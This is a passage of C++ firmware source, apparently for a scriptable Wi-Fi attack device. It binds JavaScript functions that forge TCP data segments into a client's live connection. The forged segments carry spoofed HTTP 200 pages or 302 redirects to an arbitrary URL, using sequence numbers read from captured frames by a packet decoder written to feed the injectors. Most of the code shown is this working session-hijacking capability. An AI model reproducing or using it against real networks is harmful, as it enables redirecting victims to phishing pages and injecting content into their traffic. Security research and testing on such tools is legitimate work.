    //   Sends an arbitrary L4 payload as a TCP data segment from `serverIp`.
    //   options: { bssid, dstIp, srcPort (default 80), dstPort (default 80),
    //              seq, ack, flags (default 0x18 PSH+ACK), repeat (3), gapMs }
    //   To be accepted, dstPort/seq/ack must match the real connection - read
    //   them from a captured packet with wifi.packetInfo().
    // returns: { ok, frames, len, payloadLen, status, channel, clientMac,
    //            serverIp, dstIp, srcPort, dstPort, seq, ack, error? }
    if (argc < 3 || !JS_IsString(ctx, argv[0]) || !JS_IsString(ctx, argv[1]) || !JS_IsString(ctx, argv[2]))
        return JS_ThrowTypeError(
            ctx, "wifiInjectHttp(clientMac:string, serverIp:string, payload:string, channel?:int, options?:object)"
        );

    JSCStringBuf pb;
    const char *payload = JS_ToCString(ctx, argv[2], &pb);
    return wifi_js_http_inject(ctx, argv, argc, String(payload != NULL ? payload : ""), 200);
}

JSValue native_wifiInjectHttpRedirect(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.injectHttpRedirect(clientMac, serverIp, url, channel?, options?)
    //   Same options as wifi.injectHttp(). Sends a forged HTTP response:
    //     HTTP/1.1 302 Found / Location: <url> / Content-Length: 0
    //   returns: injectHttp() shape plus { status: 302, location }
    if (argc < 3 || !JS_IsString(ctx, argv[0]) || !JS_IsString(ctx, argv[1]) || !JS_IsString(ctx, argv[2]))
        return JS_ThrowTypeError(
            ctx, "wifiInjectHttpRedirect(clientMac:string, serverIp:string, url:string, channel?:int, options?:object)"
        );

    // Copied: 'url' is still needed after wifi_js_http_inject() has run, and that
    // call allocates (and can therefore relocate the string url points into).
    String url = js_tocstring_copy(ctx, argv[2]);
    String httpPayload = "HTTP/1.1 302 Found\r\nLocation: ";
    httpPayload += url.length() > 0 ? url.c_str() : "/";
    httpPayload += "\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = wifi_js_http_inject(ctx, argv, argc, httpPayload, 302);
    JS_SetPropertyStr(ctx, *obj, "location", JS_NewString(ctx, url.c_str()));
    return JS_PopGCRef(ctx, &obj_ref);
}

JSValue native_wifiInjectHtml(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.injectHtml(clientMac, serverIp, html, channel?, options?)
    //   Sends a forged "HTTP/1.1 200 OK" response carrying `html`.
    //   options: everything wifi.injectHttp() takes, plus
    //            { status?: int (default 200), contentType?: string (default text/html) }
    // returns: injectHttp() shape plus { status, contentType }
    if (argc < 3 || !JS_IsString(ctx, argv[0]) || !JS_IsString(ctx, argv[1]) || !JS_IsString(ctx, argv[2]))
        return JS_ThrowTypeError(
            ctx, "wifiInjectHtml(clientMac:string, serverIp:string, html:string, channel?:int, options?:object)"
        );

    JSCStringBuf hb;
    const char *html = JS_ToCString(ctx, argv[2], &hb);
    String body = html != NULL ? html : "";

    int status = 200;
    String contentType = "text/html";
    if (argc > 4 && JS_IsObject(ctx, argv[4])) {
        js_get_int_prop(ctx, argv[4], "status", &status);
        js_get_string_prop(ctx, argv[4], "contentType", &contentType);
    }
    if (status < 100 || status > 599) status = 200;

    String httpPayload = "HTTP/1.1 " + String(status) + " OK\r\nContent-Type: " + contentType +
                         "\r\nContent-Length: " + String(body.length()) +
                         "\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n" + body;

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = wifi_js_http_inject(ctx, argv, argc, httpPayload, status);
    JS_SetPropertyStr(ctx, *obj, "contentType", JS_NewString(ctx, contentType.c_str()));
    return JS_PopGCRef(ctx, &obj_ref);
}

JSValue native_wifiPacketInfo(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.packetInfo(packetHex) -> object
    //   Decodes a captured frame so its values can be fed straight back into the
    //   injectors. returns:
    //   { valid, type, subtype, typeName, protected, toDs, fromDs, src, dst,
    //     bssid, hasIp, ipProtocol, ipSrc, ipDst, ipTotalLen,
    //     udp: { srcPort, dstPort } | null,
    //     tcp: { srcPort, dstPort, seq, ack, flags } | null,
    //     dns: { txid, response, qname, qtype, qclass } | null,
    //     error? }
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiPacketInfo(packetHex:string)");

    // Copied out immediately: 'hex' is read after the four stores below, each of
    // which allocates and can relocate the string it points into.
    String hex = js_tocstring_copy(ctx, argv[0]);
    uint8_t frame[WIFI_RAW_MAX_FRAME];
    size_t len = 0;

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        JS_PopGCRef(ctx, &obj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }
    JS_SetPropertyStr(ctx, *obj, "valid", JS_NewBool(false));
    JS_SetPropertyStr(ctx, *obj, "udp", JS_NULL);
    JS_SetPropertyStr(ctx, *obj, "tcp", JS_NULL);
    JS_SetPropertyStr(ctx, *obj, "dns", JS_NULL);

    if (!js_parse_hex_frame(hex.c_str(), frame, sizeof(frame), &len)) {
        JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, "packetHex is not valid hex"));
        return JS_PopGCRef(ctx, &obj_ref);
    }

    WifiParsedFrame p;
    bool parsed = wifi_parse_frame(frame, len, &p);

    JS_SetPropertyStr(ctx, *obj, "len", JS_NewInt32(ctx, (int)len));
    if (len >= 24) {
        JS_SetPropertyStr(ctx, *obj, "dst", js_mac_string(ctx, p.addr1));
        JS_SetPropertyStr(ctx, *obj, "src", js_mac_string(ctx, p.addr2));
        JS_SetPropertyStr(ctx, *obj, "bssid", js_mac_string(ctx, p.addr3));
    }
    JS_SetPropertyStr(ctx, *obj, "type", JS_NewInt32(ctx, p.type));
    JS_SetPropertyStr(ctx, *obj, "subtype", JS_NewInt32(ctx, p.subtype));
    const char *typeName = p.type == 0 ? "management" : (p.type == 1 ? "control" : "data");
    JS_SetPropertyStr(ctx, *obj, "typeName", JS_NewString(ctx, typeName));
    JS_SetPropertyStr(ctx, *obj, "protected", JS_NewBool(p.protectedFrame));
    JS_SetPropertyStr(ctx, *obj, "toDs", JS_NewBool(p.toDs));
    JS_SetPropertyStr(ctx, *obj, "fromDs", JS_NewBool(p.fromDs));

    if (p.hasIp) {
        JS_SetPropertyStr(ctx, *obj, "hasIp", JS_NewBool(true));
        const char *proto = p.ipProto == 6 ? "tcp" : (p.ipProto == 17 ? "udp" : "other");
        JS_SetPropertyStr(ctx, *obj, "ipProtocol", JS_NewString(ctx, proto));
        JS_SetPropertyStr(ctx, *obj, "ipSrc", js_ip_string(ctx, p.ipSrc));
        JS_SetPropertyStr(ctx, *obj, "ipDst", js_ip_string(ctx, p.ipDst));
        JS_SetPropertyStr(ctx, *obj, "ipTotalLen", JS_NewInt32(ctx, (int)p.ipTotalLen));
    }
    if (p.hasUdp) {
        // Each sub-object is pinned for its own build, and re-read when it is
        // stored into *obj, which is itself an allocation.
        JSGCRef udp_ref;
        JSValue *udp = JS_PushGCRef(ctx, &udp_ref);
        *udp = JS_NewObject(ctx);
        JS_SetPropertyStr(ctx, *udp, "srcPort", JS_NewInt32(ctx, (int)p.udpSrcPort));
        JS_SetPropertyStr(ctx, *udp, "dstPort", JS_NewInt32(ctx, (int)p.udpDstPort));
        JS_SetPropertyStr(ctx, *obj, "udp", *udp);
        JS_PopGCRef(ctx, &udp_ref);
    }
    if (p.hasTcp) {
        JSGCRef tcp_ref;
        JSValue *tcp = JS_PushGCRef(ctx, &tcp_ref);
        *tcp = JS_NewObject(ctx);
        JS_SetPropertyStr(ctx, *tcp, "srcPort", JS_NewInt32(ctx, (int)p.tcpSrcPort));
        JS_SetPropertyStr(ctx, *tcp, "dstPort", JS_NewInt32(ctx, (int)p.tcpDstPort));
        JS_SetPropertyStr(ctx, *tcp, "seq", JS_NewUint32(ctx, p.tcpSeq));
        JS_SetPropertyStr(ctx, *tcp, "ack", JS_NewUint32(ctx, p.tcpAck));
        JS_SetPropertyStr(ctx, *tcp, "flags", JS_NewInt32(ctx, (int)p.tcpFlags));
        JS_SetPropertyStr(ctx, *obj, "tcp", *tcp);
        JS_PopGCRef(ctx, &tcp_ref);
    }
    if (p.hasDns) {
        JSGCRef dns_ref;
        JSValue *dns = JS_PushGCRef(ctx, &dns_ref);
        *dns = JS_NewObject(ctx);
        JS_SetPropertyStr(ctx, *dns, "txid", JS_NewInt32(ctx, (int)p.dnsTxId));
        JS_SetPropertyStr(ctx, *dns, "response", JS_NewBool(p.dnsIsResponse));
        JS_SetPropertyStr(ctx, *dns, "qname", JS_NewString(ctx, p.dnsQName));
        JS_SetPropertyStr(ctx, *dns, "qtype", JS_NewInt32(ctx, (int)p.dnsQType));
        JS_SetPropertyStr(ctx, *dns, "qclass", JS_NewInt32(ctx, (int)p.dnsQClass));
        JS_SetPropertyStr(ctx, *obj, "dns", *dns);
        JS_PopGCRef(ctx, &dns_ref);
    }

    JS_SetPropertyStr(ctx, *obj, "valid", JS_NewBool(parsed));
    if (!parsed && p.error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, p.error));
    return JS_PopGCRef(ctx, &obj_ref);
}

void wifi_js_cleanup() { wifi_raw_cleanup(); }
#endif
